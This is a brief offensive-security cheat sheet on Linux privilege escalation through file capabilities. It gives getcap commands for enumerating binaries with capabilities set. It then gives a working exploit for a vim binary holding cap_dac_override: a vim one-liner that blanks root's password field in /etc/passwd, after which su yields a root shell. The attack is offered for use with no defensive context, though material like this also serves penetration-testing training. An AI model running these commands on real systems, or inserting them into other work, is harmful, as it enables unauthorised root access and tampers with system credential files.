# Capabilities

To find capabilities:

```
getcap -r / 2>/dev/null 
```

### Exploitation

To find:

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

To exploit _cap\_dac\_override_:&#x20;

For example if it is vim:

```
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Because the binary has the cap\_dac\_override capability set, it can escalate the privileges of the user who runs it.

A system file can be modified with this capability. Modifying the root user in `/etc/passwd` allows for login without password.

```
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

for non interactive method.

Then use `su` to get root access.
